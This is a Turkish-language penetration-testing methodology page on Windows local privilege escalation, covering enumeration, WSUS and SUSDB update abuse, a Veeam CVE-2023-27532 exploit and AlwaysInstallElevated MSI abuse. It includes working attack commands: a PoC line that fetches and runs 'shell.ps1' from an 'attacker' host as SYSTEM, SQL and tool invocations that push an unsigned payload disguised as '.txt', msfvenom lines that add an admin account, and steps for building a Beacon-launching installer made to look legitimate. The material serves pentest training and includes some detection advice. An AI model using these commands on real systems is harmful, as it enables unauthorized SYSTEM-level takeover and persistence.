# Windows Yerel Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

### **Windows'ta yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Bu sayfa, temel nitelikteki çeşitli kılavuzlarda yer alan genel Windows yetki yükseltme metodolojisini bir araya getirir.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Uygulamaya yönelik enumeration akışı, topluluk atölyelerinden ve kontrol listelerinden de yararlanır.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Geçmişe yönelik saldırı içeriğinde, Windows yetki yükseltme konulu DerbyCon sunumu da yer alır.<sup>[[5]](#references)</sup>

## Başlangıç Windows Teorisi

### Access Tokens

**Windows access token'larının ne olduğunu bilmiyorsanız devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı inceleyin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows'ta integrity level'ların ne olduğunu bilmiyorsanız devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta **sistemi enumerate etmenizi**, çalıştırılabilir dosyaları çalıştırmanızı ve hatta **faaliyetlerinizin tespit edilmesini** engelleyebilecek çeşitli unsurlar vardır. Yetki yükseltme enumeration'ına başlamadan önce aşağıdaki **sayfayı okuyup** bu **savunma mekanizmalarının** tümünü **enumerate etmelisiniz**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fiziksel erişim, çevrimdışı bir UEFI NVRAM düzenlemesini önyükleme öncesi DMA'ya ve Windows `SYSTEM` bellek yama zincirine de dönüştürebilir:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess sessiz yükseltme

`RAiLaunchAdminProcess` üzerinden başlatılan UIAccess süreçleri, AppInfo güvenli yol kontrolleri atlandığında istem göstermeden High IL'ye ulaşmak için kötüye kullanılabilir. UIAccess/Admin Protection atlatma iş akışının ayrıntılarına buradan bakın:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop erişilebilirlik kayıt defteri yayılımı, keyfi bir SYSTEM kayıt defteri yazımı (RegPwn) için kötüye kullanılabilir:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Yeni Windows sürümlerinde, ayrıcalıklı yerel NTLM kimlik doğrulamasının yeniden kullanılan bir SMB TCP bağlantısı üzerinden yansıtıldığı **SMB keyfi port** LPE yolu da kullanıma sunuldu:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgilerini enumerate etme

Windows sürümünde bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da inceleyin).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Sürüm Exploit'leri

Bu [site](https://msrc.microsoft.com/update-guide/vulnerability), Microsoft güvenlik açıkları hakkında ayrıntılı bilgi aramak için kullanışlıdır. Bu veritabanında 4.700'den fazla güvenlik açığı bulunur; bu da bir Windows ortamının sunduğu **devasa saldırı yüzeyini** gösterir.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS build'ini, yüklü güncellemeleri ve seçilmiş olası advisory'leri envanterler; bir sonucu geçerli kabul etmeden önce tam ürünü ve yerine geçen güncellemeleri doğrulayın.

Sürüme özgü bir local exploit için OS mimarisinin yanı sıra **çalışan işlemin mimarisini** de kontrol edin. 64-bit Windows'ta 32-bit bir işlem [WOW64 dosya sistemi yönlendirmesine](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) tabidir: `%windir%\System32` genellikle 32-bit sistem dizinine karşılık gelirken `%windir%\Sysnative`, işlemin yerel sistem dizinine erişmesini sağlar. Bu takma ad 64-bit bir işlem için kullanılamaz. Bir OS build'i veya eksik KB adayı, açığın kullanılabileceğini kanıtlamaz; çalışan build'i, yüklü veya yerine geçen güncellemeyi, işlem mimarisini ve exploit ön koşullarını söz konusu sorunla ilgili [Microsoft güvenlik bülteniyle](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) karşılaştırın.

**Sistem bilgileriyle yerel olarak**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploit'lere ait GitHub repoları:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Ortam değişkenlerinde kayıtlı herhangi bir credential/Juicy bilgi var mı?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell Geçmişi

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) adresinden öğrenebilirsiniz.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` yalnızca bir örnektir. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) normalde her kullanıcının Documents klasörüne yazar; ancak `OutputDirectory` ayarı veya `Start-Transcript -OutputDirectory` dosyaları paylaşılan ya da gizli bir klasöre yönlendirebilir. Bir transcript'i incelemeden önce etkin çıktı yolunu ve dosya ACL'sini kontrol edin: dosya, kimlik bilgileri de dahil olmak üzere komut bağımsız değişkenlerini ve çıktıları içerebilir. Okunabilir bir transcript, yalnızca içeriği kullanılabilir, daha yüksek ayrıcalıklı bir kimliği açığa çıkarıyorsa ve bu kimlik ilgili bağlamda oturum açabiliyorsa ipucu niteliğindedir.

### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; buna yürütülen komutlar, komut çağrıları ve script'lerin bazı bölümleri dahildir. Ancak yürütmenin tüm ayrıntıları ve çıktı sonuçları kaydedilmeyebilir.

Bunu etkinleştirmek için dokümantasyondaki "Transcript files" bölümünün yönergelerini izleyin ve **"Powershell Transcription"** yerine **"Module Logging"** seçeneğini tercih edin.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowersShell günlüklerindeki son 15 olayı görüntülemek için şunu çalıştırabilirsiniz:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Betik yürütülürken her kod bloğunun belgelenmesini sağlayacak şekilde, etkinliklerin tamamı ve betiğin yürütülmesine ilişkin tüm içerik kaydedilir. Bu süreç, adli incelemeler ve kötü amaçlı davranışları analiz etmek için değerli olan kapsamlı bir etkinlik denetim izi oluşturur. Yürütme sırasında tüm etkinlikler belgelenerek süreç hakkında ayrıntılı bilgiler sağlanır.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block için günlük kaydı olayları Windows Event Viewer'da şu yolda bulunabilir: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### İnternet Ayarları

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Sürücüler

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Bir HTTP WSUS uç noktası, güncelleme meta verilerinin ele geçirilmesine yönelik bir araştırma ipucudur. İstismar, istemcinin bu WSUS sunucusunu kullanıp kullanmadığına, saldırganın trafiği engelleyip engelleyemediğine veya kontrol edip edemediğine ve istemcinin güncellemelere yönelik güven ve yükleme ilkesine de bağlıdır. URL tek başına kod yürütülebileceğini kanıtlamaz. [Microsoft, WSUS meta verileri için TLS kullanılmasını önerir](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Ağda SSL kullanmayan bir WSUS güncellemesi olup olmadığını cmd'de aşağıdaki komutu çalıştırarak kontrol edin:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ya da PowerShell'de aşağıdakini kullanın:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Bunlardan biri gibi bir yanıt alırsanız:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Ve `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` veya `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` değeri `1` ise.

`UseWUServer` değeri `1` olduğunda Windows Update, yapılandırılmış intranet hizmetini kullanır. Bu, HTTP interception yolu için bir ön koşulun sağlandığını doğrular; ancak interception'ın, kötü amaçlı güncellemelerin kabul edilmesinin veya yükseltilmiş yetkilerle kurulum yapılabilmesinin mümkün olduğunu kanıtlamaz. Değer `0` olduğunda, bu ilke kapsamında yapılandırılmış WSUS endpoint'i seçilmez.

Bu güvenlik açıklarından yararlanmak için [Wsuxploit](https://github.com/pimps/wsuxploit) ve [pyWSUS ](https://github.com/GoSecure/pywsus) gibi araçlar kullanabilirsiniz. Bunlar, SSL kullanmayan WSUS trafiğine sahte güncellemeler enjekte etmek için hazırlanmış MiTM exploit script'leridir.

Araştırmayı burada okuyun:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Tam raporu buradan okuyun**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Temel olarak, bu bug'ın yararlandığı açık şudur:

> Yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates, Internet Explorer ayarlarında yapılandırılmış proxy'yi kullanıyorsa, kendi trafiğimizi yakalamak ve varlığımızda yükseltilmiş yetkili bir kullanıcı olarak kod çalıştırmak için [PyWSUS](https://github.com/GoSecure/pywsus)'ı yerel olarak çalıştırabiliriz.
>
> Ayrıca, WSUS hizmeti mevcut kullanıcının ayarlarını kullandığından, kullanıcının sertifika deposunu da kullanır. WSUS hostname'i için self-signed bir sertifika oluşturup bunu mevcut kullanıcının sertifika deposuna eklersek hem HTTP hem de HTTPS WSUS trafiğini yakalayabiliriz. WSUS, sertifika üzerinde ilk kullanımda güven türü doğrulaması uygulamak için HSTS benzeri bir mekanizma kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilir bulunuyor ve doğru hostname'e sahipse hizmet tarafından kabul edilir.

Bu güvenlik açığından [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) aracıyla yararlanabilirsiniz (yayımlandığında).

### WSUS yöneticisinin denetimindeki güncellemeler

Mevcut kimliğin WSUS sunucusunda güncellemeleri **yayımlayıp onaylayabildiği** durumlarda ayrı bir yol vardır. Sunucunun `WSUS Administrators` grubundaki etkin üyeliği ve devredilmiş WSUS izinlerini kontrol edin, ardından onaylanan güncellemeyi alacak istemci bilgisayar grubunu belirleyin. [Microsoft, güncellemeleri onaylamak için WSUS Administrator ayrıcalıkları gerektiğini belirtir](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) ve [yayımlama güven ilişkisini belgeler](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): istemciler, yerel olarak yayımlanan içerik için kullanılan imzalama sertifikasına güvenmelidir. Bunu bir yetki yükseltme yolu olarak değerlendirmeden önce aday güncellemenin imzalı ve kabul edilmiş, hedef için geçerli olduğunu ve daha yüksek ayrıcalıklı bir bağlamda yüklendiğini doğrulayın. Tek başına bir HTTP `WUServer` değeri veya grup adı bu koşulların sağlandığını göstermez.

### SUSDB özel güncelleme suistimali: `.txt`/`.esd` üzerinden imzasız payload'lar

Bu, HTTP WSUS bağlantısını yakalamaktan farklı bir güven sınırı ihlalidir: ön koşul, özel bir güncellemeyi yayımlamak ve onaylamak için **WSUS veritabanındaki (`SUSDB`) stored procedure'lere** yeterli erişimin bulunmasıdır. Olası giriş yollarından biri, bir WSUS bilgisayar hesabının kimlik doğrulamasını `SUSDB` barındıran ayrı bir MSSQL sunucusuna aktarmaktır; tam ön koşul dağıtıma göre değişir, bu nedenle SQL administrator haklarını varsaymak yerine önce `EXECUTE` izinlerini listeleyin.<sup>[[38]](#references)[[39]](#references)</sup>

WSUS istemci kimlik doğrulamasını HTTP/8530 üzerinden LDAP, SMB veya AD CS'ye aktaran ayrı saldırı yolu için bkz. [NTLM relay için WSUS HTTP'nin kötüye kullanılması](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Güncellemeyi oluşturma, hedefleme ve onaylama

Özel güncelleme iş akışı, kısıtlı bir yayımlama API'si olarak meşru WSUS prosedürlerini kullanır. Önemli durum geçişleri şunlardır:<sup>[[38]](#references)</sup>

| Aşama | İlgili stored procedure'ler |
| --- | --- |
| Güncelleme metadata'sını içe aktarma | `spImportUpdate` |
| Ön koşul, yerelleştirilmiş ve genişletilmiş XML parçalarını depolama | `spSaveXMLFragment` |
| İçerik digest'ini saldırganın denetimindeki URL ile ilişkilendirme | `spSetBatchURL` |
| Bilgisayar grubunu listeleme/oluşturma ve istemciyi ekleme | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Bu grup için kurulumu onaylama | `@actionID = 0` ve `@isAssigned = 1` ile `spDeployUpdate` |

Dosya adı, digest'ler, boyut ve `CommandLineInstallation` handler'ı, içe aktarılan metadata ve parçalar arasında tutarlı olmalıdır. İçerik URL'sini ve hedef grubunu atadıktan sonra, son onay aşağıdakine benzer; örnek GUID'leri yeniden kullanmak yerine yeni güncelleme, grup ve dağıtım tanımlayıcıları kullanın.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Uzantı kaynaklı imza atlatma

WSUS normalde imzasız rastgele yürütülebilir içeriği reddeder. Ancak `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` dosyasındaki .NET `VerifyFile` yolu, verilen dosya adı `.txt` veya `.esd` ile bitiyorsa sertifika denetimi bayrağını false olarak ayarlar; böylece baytların metin ya da geçerli bir ESD imajı olduğu önceden doğrulanmadan `CheckCertificateSignature` atlanır. Bu nedenle, örneğin `payload.exe.txt` adı verilmiş, değiştirilmemiş bir PE içerik doğrulamasından geçebilir ve daha sonra güncellemenin komut satırı yükleme işleyicisi tarafından başlatılabilir. Bu, imza sahteciliği değil, bir politika/tür karışıklığı hatasıdır.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS uyumlu staging ve otomasyon

`spDeployUpdate` çağrısı, WSUS'un kayıtlı içeriği getirmesini sağlar. Kaynak, BITS'in HTTP beklentilerini karşılamalıdır: erişilebilir bir URL tek başına yeterli değildir; çünkü aktarım, başlangıçta bir `HEAD`/`GET` akışı ve byte-range istekleri kullanır. Range desteği olmayan bir sunucu, BITS'in Range protocol header'ını gerektirdiğini belirten WSUS senkronizasyon `EventId=364` hatasına yol açar.<sup>[[39]](#references)</sup>

Araştırma PoC'si [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious), import/fragment/URL/group/deployment zinciri için gereken SQL'i oluşturur, bunu çalıştırmak üzere değiştirilmiş bir MSSQL istemcisi içerir ve içerik staging'i için `BitsWebServer.py` dosyasını sunar. Yetkili bir laboratuvar ortamında kullanılabilecek temel bir komut şöyledir:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Gözetimsiz yürütme ve yeniden deneme yoluyla kalıcılık

İstemci tarafındaki etkileşim ilkelere bağlıdır. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` ayarındaki `4 - Auto download and schedule install` seçeneği, onaylanmış bir güncellemenin kullanıcı tarafından manuel olarak seçilmesine gerek kalmadan yapılandırılmış zamanlamaya göre indirilip yüklenmesini sağlar. Testlerde, güncellemesi başarısız/tamamlanmamış durumda kalan bir payload, callback süreci sona erdikten hemen sonra yeniden sunuldu. Bu nedenle yeniden deneme davranışı, tekrarlanan yürütme yoluyla kalıcılığa dönüşebilir; ancak istemci güncelleme başarısız durumunu gösterdiğinden gürültülüdür.<sup>[[39]](#references)</sup>

#### Tespit ve sağlamlaştırma için inceleme noktaları

Bu zincir için sunucu ve istemci tarafında incelenebilecek yararlı noktalar:<sup>[[39]](#references)</sup>

- `SUSDB` üzerinde `spCreateTargetGroup`, `spSetBatchURL` ve `spDeployUpdate` yürütmelerini denetleyin; yeni hedefleme gruplarını, harici içerik kaynaklarını, `.txt`/`.esd` güncelleme payload’larını ve beklenmeyen sorumlular (özellikle bilgisayar hesabı olmayan hesaplar) tarafından gerçekleştirilen dağıtımları araştırın.
- `C:\Program Files\Update Services\LogFiles` konumunda `ContentSyncAgent`, `FileVerified`, yazım hatalı `FileVerficationFailed` ve `EventId=364` kayıtlarını inceleyin; doğrulama işlemini uzantıya ve dosya içeriği imzasına göre ilişkilendirin, yalnızca dosya uzantısına güvenmeyin.
- Sürekli başarısız olan/yeniden denen Windows Update yüklemelerini ve `.txt` veya `.esd` adlı içeriklerden kaynaklanan PE yürütmelerini ya da beklenmeyen alt süreç/ağ etkinliklerini araştırın.
- Desteklendiği yerlerde veritabanı hizmetinde Authentication için Extended Protection zorunlu kılın ve veritabanı ağına erişimi WSUS sunucusu ile yetkili yönetim sistemleriyle kısıtlayın. Özel güncelleme prosedürlerindeki `EXECUTE` izinlerini en aza indirin ve denetleyin.

## Üçüncü Taraf Otomatik Güncelleyiciler ve Agent IPC (local privesc)

Birçok kurumsal agent, localhost üzerinde bir IPC arayüzü ve ayrıcalıklı bir güncelleme kanalı sunar. Kayıt işlemi saldırganın sunucusuna yönlendirilebiliyorsa ve güncelleyici sahte bir root CA'ya veya zayıf imza denetimlerine güveniyorsa, yerel bir kullanıcı SYSTEM hizmetinin yükleyeceği kötü amaçlı bir MSI gönderebilir. Genelleştirilmiş tekniği (Netskope stAgentSvc zincirine dayalı – CVE-2025-0309) burada görebilirsiniz:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 üzerinden SYSTEM)

Veeam Backup & Replication ve Cloud Connect, varsayılan olarak **TCP/9401** üzerinden bir temel yedekleme hizmeti kullanır. [Veeam'in duyurusu](https://www.veeam.com/kb4424), yedekleme ağı sınırları içinde şifrelenmiş yapılandırma veritabanı kimlik bilgilerinin kimlik doğrulaması olmadan ifşa edilmesini açıklar; ayrı bir herkese açık PoC ise **NT AUTHORITY\SYSTEM** olarak komut yürütme yolunu gösterir.<sup>[[12]](#references)</sup> Hizmet localhost dışındaki adreslere de bağlanabilir; bu nedenle gerçek adresini ve PID'sini kontrol edin.

- **Keşif**: TCP/9401'in `Veeam.Backup.Service.exe` sürecine ait olduğunu doğrulayın, ardından yüklü ürünü ve yama üstverilerini inceleyin. `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ipucu sağlar; ancak tek başına eksiksiz bir yama denetimi değildir.
- **Düzeltilmiş en düşük sürümler**: Veeam, düzeltilmiş ilk sürümler olarak **11a build 11.0.1.1261 P20230227** ve **12 build 12.0.0.1420 P20230223** sürümlerini listeler; daha eski sürümler etkilenir. Dört bileşenli bir dosya sürümü tek başına, aynı build numaralarındaki yamalanmamış temel sürüm ile daha sonraki yamayı ayırt edemez. Sınır build'ini düzeltilmiş olarak nitelendirmeden önce yama tanımlayıcısını [üreticinin build geçmişi](https://www.veeam.com/kb2680) ile doğrulayın.
- **Exploit**: `VeeamHax.exe` gibi bir PoC'yi gerekli Veeam DLL'leriyle aynı dizine koyun, ardından yerel socket üzerinden bir SYSTEM payload tetikleyin:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Alıntılanan PoC, ek ön koşullar sağlandığında SYSTEM olarak komut çalıştırılabildiğini gösterir; satıcının güvenlik duyurusu kimlik bilgilerinin ifşa edilmesi sorununu açıklar.
## KrbRelayUp

Yerel bir Kerberos relay, uygun bir COM server kimlik doğrulaması yaptığında ve relay edilen principal hedef nesne üzerinde izinlere sahip olduğunda, daha düşük ayrıcalıklı bir oturum açma işleminden ayrıcalıklı bir dizin yazma işlemine geçiş sağlayabilir. [KrbRelay belgeleri](https://github.com/cube0x0/KrbRelay) hem RBCD hem de `msDS-KeyCredentialLink` (shadow-credential) LDAP yazma işlemlerini açıklar; KrbRelayUp bu yolların bazılarını otomatikleştirir. Bir RBCD zinciri, geçerli delegasyon ve hedef nesne izinleri gerektirirken shadow-credential zinciri, key-credential yazma izinleri ve sertifika kimlik doğrulama yolunu destekleyen bir KDC gerektirir. Bu yollardan hiçbiri yalnızca etki alanı üyeliğinden kaynaklanmaz.

Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM class'ın kimlik doğrulama ve impersonation düzeylerini kontrol edin. Çağıranın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: Bir WinRM oturumu, etkileşimli oturum açma veya yeni kimlik bilgileriyle oturum açma işleminden farklı davranabilir. Firewall/OXID yönlendirmesi ve yüklü güncellemeler de sonucu değiştirebilir. İzin verici bir ilkeyi veya eşleşen ACL'yi incelemeye değer bir durum olarak ele alın; pasif numaralandırma COM coercion, relay kimlik doğrulaması veya dizine yazma işlemlerini tetiklememelidir. Bir makine hesabının shadow credential'ı, makine bileti alınmasına yol açabilir; bu hesap gerekli dizin çoğaltma izinlerine sahipse ancak o zaman ayrı bir DCSync yolu mümkün olabilir.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresindeki **exploit'i bulun**

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> sayfasına bakın.

## AlwaysInstallElevated

**Eğer** bu 2 kayıt defteri girdisi **etkinse** (değer **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (çalıştırabilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir Meterpreter oturumunuz varsa, bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Power-up'taki `Write-UserAddMSI` komutunu kullanarak, ayrıcalıkları yükseltmek için geçerli dizinde bir Windows MSI binary'si oluşturun. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişiminiz olması gerekir):

```
Write-UserAddMSI
```

Oluşturulan binary'yi ayrıcalıkları yükseltmek için çalıştırmanız yeterlidir.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu eğitimi okuyun. Yalnızca **command line** komutlarını **çalıştırmak** istiyorsanız bir "**.bat**" dosyasını da wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**'yu açın, **Create a new project**'i seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- 4. adımın 3. adımına (include edilecek dosyaları seçme) gelene kadar **Next**'e tıklayın. **Add**'e tıklayıp az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** bölümünde **TargetPlatform** değerini **x86** yerine **x64** olarak değiştirin.
  - Yüklü uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi başka özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece yükleyici çalıştırılır çalıştırılmaz Beacon payload'ı çalıştırılır.
- **Custom Action Properties** altında **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build edin**.
